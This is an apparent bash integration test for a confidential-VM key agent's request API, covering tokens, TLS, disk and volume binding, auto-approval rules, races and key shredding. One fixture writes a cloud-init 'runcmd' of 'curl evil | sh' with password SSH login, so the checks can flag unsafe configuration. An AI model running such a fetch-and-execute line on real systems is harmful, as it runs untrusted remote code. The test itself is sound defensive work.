#!/bin/bash
# The request API against a running agent (test/local.sh starts one):
# tokens, checks, auto rules, system disks and volumes, races, shredding.
#
#   WX_API           the agent's API, e.g. http://127.0.0.1:8095
#   WX_BAO           the OpenBao container (dev mode, root token "root")
#   WX_DB_CONTAINER  the CockroachDB container
#   WX_POLICY        where the KBS stub writes the policy it was given
#   WX_TLS           with TLS: the directory with ca.pem and the client certificates
set -uo pipefail
A=${WX_API:?} BAO=${WX_BAO:?} DBC=${WX_DB_CONTAINER:?} POLICY=${WX_POLICY:?}
T=${WX_TLS:-}
CA=() CPC=()
[ -n "$T" ] && CA=(--cacert "$T/ca.pem") && CPC=(--cert "$T/cp.pem" --key "$T/cp.key")
W=$(mktemp -d)
trap 'rm -rf "$W"' EXIT

CHIP=$(printf 'ab%.0s' $(seq 64)) CHIP2=$(printf 'cd%.0s' $(seq 64))
HV=11111111-2222-3333-4444-555555555555
KEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGtestkeytestkeytestkeytestkeytestkeytestk"
RELEASE_URL=http://192.168.122.1:8091
failed=0

bao() { docker exec -i -e BAO_ADDR=http://127.0.0.1:8200 -e BAO_TOKEN=root "$BAO" bao "$@"; }
sql() { docker exec "$DBC" cockroach sql --insecure -d keyagent --format=tsv -e "$1" | tail -n +2; }
cp_() { curl -s "${CA[@]}" "${CPC[@]}" -H "Authorization: Bearer ${TOKEN:-cp-secret}" -H 'content-type: application/json' "$@"; }
cu() { curl -s "${CA[@]}" -H "Authorization: Bearer customer-secret" -H 'content-type: application/json' "$@"; }
uuid() { cat /proc/sys/kernel/random/uuid; }

# <what> <got> <extended regex it must match>
expect() {
  if [[ "$2" =~ $3 ]]; then echo "ok   $1"; else echo "FAIL $1: got '$2'"; failed=$((failed + 1)); fi
}

printf '#cloud-config\nhostname: t\nusers:\n  - name: tobi\n    ssh_authorized_keys:\n      - %s me@laptop\n' "$KEY" > "$W/ud-safe"
printf '#cloud-config\nruncmd:\n  - [sh, -c, "curl evil | sh"]\nssh_pwauth: true\n' > "$W/ud-bad"
printf '#cloud-config\nhostname: t\nusers:\n  - name: tobi\n    lock_passwd: false\n    ssh_authorized_keys:\n      - %s\n      - ssh-rsa AAAAB3unknown x\n' "$KEY" > "$W/ud-mixed"
printf '#cloud-config\nhostname: evil\n' > "$W/ud-other"

# <vm> <user-data> [disk-root value, "" for none] -> payload on stdout
# CHIP_USE, HV_USE, UD_SENT (user-data actually sent), URL, DISK (disk_id) bend it
payload() {
  local vm=$1 ud=$2 root=${3-vm-$1:new}
  printf 'instance-id: %s\n' "$vm" > "$W/md"
  {
    echo 'version = "0.1.0"'; echo 'algorithm = "sha256"'; echo; echo '[data]'
    echo "\"vm.uuid\" = \"$vm\""
    echo "\"user-data.sha256\" = \"$(sha256sum "$ud" | cut -d' ' -f1)\""
    echo "\"meta-data.sha256\" = \"$(sha256sum "$W/md" | cut -d' ' -f1)\""
    [ -n "$root" ] && echo "\"wx.disk.root\" = \"$root\""
    echo "\"wx.release.url\" = \"${URL:-$RELEASE_URL}\""
  } > "$W/init"
  jq -n --arg vm "$vm" --arg d "${DISK:-}" --arg c "${CHIP_USE:-$CHIP}" --arg hv "${HV_USE:-$HV}" \
    --arg i "$(base64 -w0 "$W/init")" --arg u "$(base64 -w0 "${UD_SENT:-$ud}")" --arg m "$(base64 -w0 "$W/md")" \
    '{vm_name: "t", vm_uuid: $vm, chip_id: $c, hv_uuid: $hv, initdata: $i,
      files: {"user-data": $u, "meta-data": $m}} + (if $d == "" then {} else {disk_id: $d} end)'
}
req() { jq -n --arg t "$1" --argjson p "$2" '{type: $t, payload: $p}' | cp_ -X POST --data-binary @- "$A/api/requests"; }
st() { jq -r '"\(.status) \(.reason)"'; }
decide() { cu -X POST -d "{\"approve\":$2}" "$A/api/customer/requests/$(echo "$1" | jq .id)" | st; }

echo "--- the worker"
expect "a worker sees the trust store (SSL_CERT_FILE)" "$(curl -s "${CA[@]}" "$A/health")" '"trustStore":"/[^"]+"'

echo "--- tokens"
expect "no token" "$(TOKEN=x req create '{}')" unauthorized
expect "customer token cannot file" "$(curl -s "${CA[@]}" -H 'Authorization: Bearer customer-secret' -d '{}' "$A/api/requests")" unauthorized
if [ -n "$T" ]; then
  echo "--- TLS"
  cpTry() { curl -s "${CA[@]}" -H "Authorization: Bearer cp-secret" -H 'content-type: application/json' "$@" -d '{"type":"unlock","payload":{}}' "$A/api/requests"; }
  expect "plain HTTP on the TLS port" "$(curl -s -o /dev/null -w '%{http_code}' "${A/https/http}/health")" "^400$"
  expect "control plane token without its certificate" "$(cpTry)" unauthorized
  expect "  with a certificate from the CA, another subject" "$(cpTry --cert "$T/other.pem" --key "$T/other.key")" unauthorized
  expect "  with a stranger's certificate: refused by TLS" "$(cpTry --cert "$T/stranger.pem" --key "$T/stranger.key" -o /dev/null -w '%{http_code}')" "^400$"
  expect "  with its certificate: through to the checks" "$(cpTry "${CPC[@]}")" "bad request"
  expect "customer API needs no certificate" "$(cu -X POST "$A/api/customer/vtpm/zz/unbind")" "bad HOST_DATA"
  expect "UI needs no certificate" "$(curl -s "${CA[@]}" -o /dev/null -w '%{http_code}' -u kunde:ui-secret "$A/settings")" "^200$"
fi
expect "unlock only from the release" "$(req unlock '{}')" "bad request"

echo "--- system disks"
VM=$(uuid)
expect "own disk_id refused" "$(req create "$(DISK=vol-$(uuid) payload "$VM" "$W/ud-safe")" | st)" "rejected.*no disk ID of its own"
expect "wrong release URL" "$(req create "$(URL=http://evil:1 payload "$VM" "$W/ud-safe")" | st)" "rejected.*our key release"
expect "user-data swapped after hashing" "$(req create "$(UD_SENT=$W/ud-other payload "$VM" "$W/ud-safe")" | st)" "rejected.*user-data matches"
R=$(req create "$(payload "$(uuid)" "$W/ud-bad")")
expect "create, unsafe cloud-init still applied" "$(echo "$R" | st)" "^applied"
expect "  with remarks" "$(sql "select checks::TEXT from requests where id = $(echo "$R" | jq .id)")" "runcmd.*password"
expect "create" "$(req create "$(payload "$VM" "$W/ud-safe")" | st)" "^applied"
expect "  disk entry" "$(bao kv get -format=json "wx/disks/vm-$VM" | jq -c '.data.data | {kind, status}')" '"kind":"system","status":"active"'
expect "  key, 44 base64 characters" "$(bao read -format=json "kv/disk/vm-$VM/key" | jq '.data.data | length')" "^44$"
HD=$(bao kv get -format=json "wx/attachments/vm-$VM" | jq -r .data.data.host_data)
expect "  vTPM state key" "$(bao read -format=json "kv/vtpm/$HD/state" | jq '.data.data | length')" "^32$"
expect "  in the KBS policy" "$(grep -c "vm-$VM" "$POLICY")" "^1$"
expect "create twice" "$(req create "$(payload "$VM" "$W/ud-safe")" | st)" "rejected.*no system disk yet"
expect "system disk to another VM" "$(req attach "$(DISK=vm-$VM payload "$(uuid)" "$W/ud-safe" "")" | st)" "rejected.*not a system disk"
expect "detach, wrong VM" "$(req detach "{\"disk_id\":\"vm-$VM\",\"vm_uuid\":\"$(uuid)\"}" | st)" "rejected.*attached to this VM"

echo "--- volumes"
VOL=vol-$(uuid)
expect "volume needs vol-" "$(req create_volume "{\"disk_id\":\"vm-$(uuid)\"}" | st)" "rejected"
expect "create_volume" "$(req create_volume "{\"disk_id\":\"$VOL\"}" | st)" "^applied"
expect "  no binding yet" "$(bao kv get "wx/attachments/$VOL" >/dev/null 2>&1 && echo yes || echo no)" "^no$"
expect "attach with another initdata" "$(req attach "$(DISK=$VOL payload "$VM" "$W/ud-bad")" | st)" "rejected.*the VM's own"
R=$(req attach "$(DISK=$VOL payload "$VM" "$W/ud-safe")")
expect "attach, no auto rule: pending" "$(echo "$R" | st)" "^pending"
expect "  control plane cannot decide" "$(cp_ -X POST -d '{"approve":true}' "$A/api/customer/requests/$(echo "$R" | jq .id)")" unauthorized
expect "  customer approves" "$(decide "$R" true)" "^applied"
expect "  bound to the VM's HOST_DATA" "$(bao kv get -format=json "wx/attachments/$VOL" | jq -r .data.data.host_data)" "^$HD$"
expect "  decided once only" "$(decide "$R" false)" "^applied"
expect "detach volume" "$(req detach "{\"disk_id\":\"$VOL\",\"vm_uuid\":\"$VM\"}" | st)" "^applied"

echo "--- a volume as the main disk"
BV=vol-$(uuid) BVM=$(uuid)
req create_volume "{\"disk_id\":\"$BV\"}" >/dev/null
bootPayload() { DISK=$BV payload "$1" "$W/ud-safe" "$BV:$2" | jq '. + {boot: true}'; }
expect "boot volume named as existing before its first boot" "$(req attach "$(bootPayload "$BVM" existing)" | st)" "rejected.*as 'new'"
expect "boot volume, VM with a system disk" "$(req attach "$(bootPayload "$VM" new)" | st)" "rejected.*boots from this volume"
R=$(req attach "$(bootPayload "$BVM" new)")
expect "boot volume as new" "$(echo "$R" | st)" "^pending"
expect "  customer approves" "$(decide "$R" true)" "^applied"
BHD=$(bao kv get -format=json "wx/attachments/$BV" | jq -r .data.data.host_data)
expect "  with the VM's vTPM" "$(bao read -format=json "kv/vtpm/$BHD/state" | jq '.data.data | length')" "^32$"
expect "  marked as booted from" "$(bao kv get -format=json "wx/disks/$BV" | jq -r .data.data.booted)" "^true$"
req detach "{\"disk_id\":\"$BV\",\"vm_uuid\":\"$BVM\"}" >/dev/null
expect "  the VM goes: no shredding asked for a volume" "$(sql "select count(*) from requests where type = 'delete_disk' and payload->>'disk_id' = '$BV'")" "^0$"
BVM2=$(uuid)
expect "booted volume again as new" "$(req attach "$(bootPayload "$BVM2" new)" | st)" "rejected.*as 'existing'"
expect "booted volume to a new VM as existing" "$(req attach "$(bootPayload "$BVM2" existing)" | st)" "^pending"

echo "--- auto rules"
jq -n --arg k "$KEY" --arg c "$CHIP" --arg hv "$HV" \
  '{auto_attach: true, auto_add_host: true, allowed_ssh_keys: [$k], host_pool: [{hv_uuid: $hv, chip_id: $c, name: "hv1"}]}' \
  | bao kv put wx/settings - >/dev/null 2>&1 || {
  jq -n --arg k "$KEY" --arg c "$CHIP" --arg hv "$HV" \
    '{auto_attach: true, auto_add_host: true, allowed_ssh_keys: [$k], host_pool: [{hv_uuid: $hv, chip_id: $c, name: "hv1"}]}' > "$W/s.json"
  docker cp -q "$W/s.json" "$BAO:/tmp/s.json" && bao kv put wx/settings @/tmp/s.json >/dev/null
}
expect "safe cloud-init, host in pool: automatic" "$(req attach "$(DISK=$VOL payload "$VM" "$W/ud-safe")" | st)" "^applied"
req detach "{\"disk_id\":\"$VOL\",\"vm_uuid\":\"$VM\"}" >/dev/null
MIXED=$(uuid)
req create "$(payload "$MIXED" "$W/ud-mixed")" >/dev/null
R=$(req attach "$(DISK=$VOL payload "$MIXED" "$W/ud-mixed")")
expect "VM with password login, unknown key: pending" "$(echo "$R" | st)" "^pending"
expect "  remarks" "$(sql "select checks::TEXT from requests where id = $(echo "$R" | jq .id)")" "password login.*unknown SSH key"
decide "$R" false >/dev/null
R=$(req attach "$(CHIP_USE=$CHIP2 DISK=$VOL payload "$VM" "$W/ud-safe")")
expect "HV UUID in the pool, other chip: pending" "$(echo "$R" | st)" "^pending"
expect "  remark" "$(sql "select checks::TEXT from requests where id = $(echo "$R" | jq .id)")" "hardware swapped"
decide "$R" false >/dev/null
expect "add_host from the pool: automatic" "$(req add_host "{\"vm_uuid\":\"$VM\",\"chip_id\":\"$CHIP\"}" | st)" "^applied"

echo "--- reprovision"
RVM=$(uuid)
req create "$(payload "$RVM" "$W/ud-safe")" >/dev/null
OLDHD=$(bao kv get -format=json "wx/attachments/vm-$RVM" | jq -r .data.data.host_data)
K0=$(bao read -format=json "kv/disk/vm-$RVM/key" | jq -c .data.data)
printf '#cloud-config\nhostname: neu\nusers:\n  - name: tobi\n    ssh_authorized_keys:\n      - %s\n' "$KEY" > "$W/ud-new"
expect "another VM's disk" "$(req reprovision "$(DISK=vm-$RVM payload "$(uuid)" "$W/ud-new" "vm-$RVM:new")" | st)" "rejected.*attached to this VM"
expect "named as existing" "$(req reprovision "$(payload "$RVM" "$W/ud-new" "vm-$RVM:existing")" | st)" "rejected.*as 'new'"
R=$(req reprovision "$(payload "$RVM" "$W/ud-new")")
expect "never automatic, even with auto rules" "$(echo "$R" | st)" "^pending"
expect "  warns what it does" "$(sql "select checks::TEXT from requests where id = $(echo "$R" | jq .id)")" "gone for good"
expect "  customer approves" "$(decide "$R" true)" "^applied"
expect "  disk key overwritten" "$([ "$K0" != "$(bao read -format=json "kv/disk/vm-$RVM/key" | jq -c .data.data)" ] && echo yes)" "^yes$"
expect "  old vTPM gone" "$(bao kv get "wx/vtpm/$OLDHD" >/dev/null 2>&1 && echo yes || echo no)" "^no$"
NEWHD=$(bao kv get -format=json "wx/attachments/vm-$RVM" | jq -r .data.data.host_data)
expect "  bound to the new initdata" "$([ "$NEWHD" != "$OLDHD" ] && echo yes)" "^yes$"
expect "  with a vTPM of its own" "$(bao read -format=json "kv/vtpm/$NEWHD/state" | jq '.data.data | length')" "^32$"
DV=vol-$(uuid)
req create_volume "{\"disk_id\":\"$DV\"}" >/dev/null
expect "data volume attached to it" "$(req attach "$(DISK=$DV payload "$RVM" "$W/ud-new")" | st)" "^applied"
R=$(req reprovision "$(DISK=$DV payload "$RVM" "$W/ud-new" "$DV:new")")
expect "a data volume is not the main disk" "$(echo "$R" | st)" "rejected.*main disk"
expect "  and nothing else is wrong with it" "$(echo "$R" | st)" "^rejected checks failed: it is the VM's main disk$"

echo "--- races"
# RACE_ROUNDS=<n> runs it n times; a round that goes wrong says everything it saw
for round in $(seq "${RACE_ROUNDS:-1}"); do
  V2=vol-$(uuid)
  made=$(req create_volume "{\"disk_id\":\"$V2\"}")
  req attach "$(DISK=$V2 payload "$VM" "$W/ud-safe")" > "$W/r1" &
  req attach "$(DISK=$V2 payload "$VM" "$W/ud-safe")" > "$W/r2" &
  wait
  both="$(st < "$W/r1"; st < "$W/r2")"
  if [[ ! "$both" =~ applied || ! "$both" =~ rejected ]]; then
    echo "     round $round, $V2: create_volume answered $made"
    echo "     r1: $(cat "$W/r1")"
    echo "     r2: $(cat "$W/r2")"
    sql "select id, type, status, decided_by, reason, checks::TEXT from requests where payload->>'disk_id' = '$V2' order by id" | sed 's/^/     /'
  fi
  expect "two attaches at once: one wins" "$both" "applied"
  expect "  the other is rejected" "$both" "rejected"
done

echo "--- the VM goes"
expect "detach by vm_uuid" "$(req detach "{\"vm_uuid\":\"$VM\"}" | st)" "^applied"
expect "  binding gone" "$(bao kv get "wx/attachments/vm-$VM" >/dev/null 2>&1 && echo yes || echo no)" "^no$"
expect "  key kept" "$(bao read -format=json "kv/disk/vm-$VM/key" | jq '.data.data | length')" "^44$"
ID=$(sql "select id from requests where type = 'delete_disk' and payload->>'disk_id' = 'vm-$VM' and status = 'pending'")
expect "  customer asked to shred" "$ID" "^[0-9]+$"
K0=$(bao read -format=json "kv/disk/vm-$VM/key" | jq -c .data.data)
expect "customer approves" "$(cu -X POST -d '{"approve":true}' "$A/api/customer/requests/$ID" | st)" "^applied"
expect "  key overwritten" "$([ "$K0" != "$(bao read -format=json "kv/disk/vm-$VM/key" | jq -c .data.data)" ] && echo yes)" "^yes$"
expect "  disk deleted" "$(bao kv get -format=json "wx/disks/vm-$VM" | jq -r .data.data.status)" "^deleted$"
expect "  vTPM state shredded" "$(bao kv get "wx/vtpm/$HD" >/dev/null 2>&1 && echo yes || echo no)" "^no$"

echo "--- customer API"
expect "lease reset, bad ID" "$(cu -X POST "$A/api/customer/disks/x/lease/reset")" "bad disk ID"
expect "lease reset" "$(cu -X POST "$A/api/customer/disks/$VOL/lease/reset")" "reset"
expect "unbind, bad HOST_DATA" "$(cu -X POST "$A/api/customer/vtpm/zz/unbind")" "bad HOST_DATA"

echo
[ $failed = 0 ] && echo "all passed" || echo "$failed FAILED"
exit $((failed > 0))
